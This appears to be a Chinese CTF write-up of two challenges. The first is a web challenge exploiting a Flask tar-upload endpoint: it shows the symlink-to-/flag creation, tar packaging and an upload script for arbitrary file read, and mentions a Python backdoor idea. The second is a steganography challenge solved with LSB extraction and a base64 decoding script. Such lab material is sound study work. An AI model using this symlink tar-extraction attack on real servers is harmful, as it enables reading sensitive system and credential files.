
===

## [WEB] [NSSRound#6 Team] check(V2)

### 题解

开门 flask 源码:

```python
# -*- coding: utf-8 -*-
from flask import Flask,request
import tarfile
import os

app = Flask(__name__)
app.config['UPLOAD_FOLDER'] = './uploads'
app.config['MAX_CONTENT_LENGTH'] = 100 * 1024
ALLOWED_EXTENSIONS = set(['tar'])
# 只允许上传 tar 后缀文件

def allowed_file(filename):
    return '.' in filename and \
        filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS

@app.route('/')
def index():
    with open(__file__, 'r') as f:
        return f.read()

@app.route('/upload', methods=['POST'])
def upload_file():
    if 'file' not in request.files:
        return '?'
    file = request.files['file']
    if file.filename == '':
        return '?'
    print(file.filename)
    if file and allowed_file(file.filename) and '..' not in file.filename and '/' not in file.filename:
        # 防路径穿越
        file_save_path = os.path.join(app.config['UPLOAD_FOLDER'], file.filename)
        if(os.path.exists(file_save_path)):
            return 'This file already exists'
        file.save(file_save_path)
    else:
        return 'This file is not a tarfile'
    try:
        tar = tarfile.open(file_save_path, "r")
        tar.extractall(app.config['UPLOAD_FOLDER'])
    except Exception as e:
        return str(e)
    os.remove(file_save_path)
    return 'success'

@app.route('/download', methods=['POST'])
def download_file():
    filename = request.form.get('filename')
    if filename is None or filename == '':
        return '?'
    
    filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
    
    if '..' in filename or '/' in filename:
        return '?'
    
    if not os.path.exists(filepath) or not os.path.isfile(filepath):
        return '?'
    
    with open(filepath, 'r') as f:
        return f.read()
    
@app.route('/clean', methods=['POST'])
def clean_file():
    os.system('su ctf -c /tmp/clean.sh')
    return 'success'

if __name__ == '__main__':
    app.run(host='0.0.0.0', debug=True, port=80)
```

审计了一下代码, 应该是传一个恶意的 tar 打包文件上去就可以了; 关于 tar, 打包命令如下:

```bash
tar -cvf <tar_filename> <origin_name>
```

值得一提的是, tar 不是压缩文件, 而是 **打包/归档**, 结构相对保持不变;

首先想到的是**可执行文件**: 传一个 python 后门过去, 这里要注意, flask 配置中, 对某一地址的 python 文件是默认静态读取的;

还有另一种攻击方式: **软链接攻击**, 传一个软链接文件上去, 例如链接到 `/etc/passwd`, 然后读这个软链接文件, 就可以得到泄露的文件, 从而达到任意读的目的;

实测之后发现软链接攻击有效, 创建软链接:

```bash
echo "flag" > /flag
ln -sf /flag ./slink 
```

打包:

```bash
tar -cf ./slink.tar ./slink
```

上传:

```python
import requests

url = 'http://node5.anna.nssctf.cn:24758/upload'
proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080'
}

f = open(r'./slink.tar', 'rb')
files = {'file': f}

try:
    resp = requests.post(url, files=files, proxies=proxies, timeout=30)
    print(resp.status_code)
    print(resp.text)
finally:
    f.close()
```

![57-1.png](57-1.png)

下载:

![57-2.png](57-2.png)

### 总结

主要收获: 利用上传软链接文件进行任意读文件;

需要注意的一个坑是, windows 中 git bash **无法得到真正的软链接文件;**

## [MISC] [NSSRound#V Team] 画出一个flag

### 题解

下载附件, 是一个图片, 用 stegsolve 打开:

分析发现 RGB 三通道的最低位有一串可疑的隐藏数据, `PK` 开头说明是一个压缩包, 含有一个名字就是 `flag.dat` 的执行文件:

![58-1.png](58-1.png)

`save bin` 之后在 windows 系统中解压, 打开这个执行文件:

![58-2.png](58-2.png)

解码输出:

```python
import base64

path = "flag.txt"

bin_data = []
for line in open(path, "r").readlines():
    line = line.strip()

    bin_str = ''
    for tmp in base64.b64decode(line):
        bin_str += str(bin(tmp))[2:].zfill(8)

    bin_data.append(bin_str)

with open("out.txt", "w") as f:
    for bin_str in bin_data:
        f.write(bin_str + "\n")
```

vscode 打开:

![58-3.png](58-3.png)

把图缩小, 注意右边有隐写, 这就是 flag:

```
NSSCTF{!!Draw_draw_A_flag!!}
```

